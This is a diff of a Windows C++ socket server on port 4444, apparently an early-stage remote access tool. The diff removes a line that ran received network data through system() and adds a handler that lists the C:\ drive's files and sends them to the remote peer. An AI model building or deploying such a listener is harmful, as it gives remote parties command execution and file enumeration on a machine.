@@ -11,6 +11,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <iostream>
+#include <sstream>
 #include <vector>
 
 // Need to link with Ws2_32.lib
@@ -20,7 +21,8 @@
 #define DEFAULT_BUFLEN 512
 #define DEFAULT_PORT "4444"
 
-
+void processCommand(std::vector<char> buffer, std::vector<char>& outputBuffer);
+void listFiles(std::vector<char>& outputBuffer, std::string directory = "C:\\*");
 
 int __cdecl main(void)
 {
@@ -34,8 +36,7 @@ int __cdecl main(void)
 	struct addrinfo hints;
 
 	int iSendResult;
-	std::vector<char> buffer(5000);
-	std::vector<char> outputBuffer(5000);
+
 	char recvbuf[DEFAULT_BUFLEN];
 	int recvbuflen = DEFAULT_BUFLEN;
 
@@ -106,44 +107,26 @@ int __cdecl main(void)
 
 	// No longer need listening socket
 	closesocket(ListenSocket);
-
 	// Receive until the peer shuts down the connection
 	do {
-		iResult = recv(ServerSocket, buffer.data(), buffer.size(), 0);
+		std::vector<char> inputBuffer(5000);
+		std::vector<char> outputBuffer;
+		iResult = recv(ServerSocket, inputBuffer.data(), inputBuffer.size(), 0);
 		std::cout << "data has been received."<< std::endl;
 		if (iResult != -1)
 		{
-			buffer.resize(iResult);
+			inputBuffer.resize(iResult);
 		}
-		outputBuffer.emplace(outputBuffer.begin(), system(buffer.data()));
-		/*iResult = recv(ServerSocket, recvbuf, recvbuflen, 0);
-		if (iResult > 0) 
+		if (iResult != 0)
 		{
-			std::cout << recvbuf << std::endl;
-			std::cout << "Bytes received: " << iResult << std::endl;
-			// Echo the buffer back to the sender
-			iSendResult = send(ServerSocket, recvbuf, iResult, 0);
-			if (iSendResult == SOCKET_ERROR) 
-			{
-				std::cout << "send failed with error: " << WSAGetLastError() << std::endl;
-				closesocket(ServerSocket);
-				WSACleanup();
-				return 1;
-			}
-			std::cout << "Bytes sent: " << iSendResult << std::endl;
+			processCommand(inputBuffer, outputBuffer);
+			std::cout << std::endl;
+			iResult = send(ServerSocket, outputBuffer.data(), outputBuffer.size(), 0);
 		}
-		else if (iResult == 0)
+		else
 		{
-			std::cout << "Connection closing..." << std::endl;
+			break;
 		}
-		else 
-		{
-			std::cout << "recv failed with error: " << WSAGetLastError() << std::endl;
-			closesocket(ServerSocket);
-			WSACleanup();
-			return 1;
-		}*/
-
 	} while (true);
 
 	// shutdown the connection since we're done
@@ -159,6 +142,53 @@ int __cdecl main(void)
 	// cleanup
 	closesocket(ServerSocket);
 	WSACleanup();
-	while (1);
 	return 0;
+}
+
+void processCommand(std::vector<char> buffer, std::vector<char>& outputBuffer)
+{
+	std::string command = buffer.data();
+	switch (buffer[0])
+	{
+	case 'd':
+		listFiles(outputBuffer);
+		break;
+	}
+}
+//Function to build a basic file structure outline of the client machine
+void listFiles(std::vector<char>& outputBuffer, std::string directory)
+{
+	WIN32_FIND_DATA fileData;
+	__int64 filesize = 0;
+	HANDLE hFind = INVALID_HANDLE_VALUE;
+	//Locates the file information for the specificed directory
+	//Default will be the C:\ Drive
+	hFind = FindFirstFile(directory.c_str(), &fileData);
+	do
+	{
+		if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+		{
+			std::string build;
+			build = build + "  " + fileData.cFileName + "   <DIR>\n";
+			for (auto& element : build)
+			{
+				outputBuffer.push_back(element);
+			}
+		}
+		else
+		{
+			LARGE_INTEGER data;
+			data.LowPart = fileData.nFileSizeLow;
+			data.HighPart = fileData.nFileSizeHigh;
+			filesize = data.QuadPart;
+			std::string build;
+			build = build + "  " + fileData.cFileName + "   ";
+			build += static_cast<std::ostringstream*>(&(std::ostringstream() << filesize))->str();
+			build += " bytes\n";
+			for (auto& element : build)
+			{
+				outputBuffer.push_back(element);
+			}
+		}
+	} while (FindNextFile(hFind, &fileData) != 0);
 }
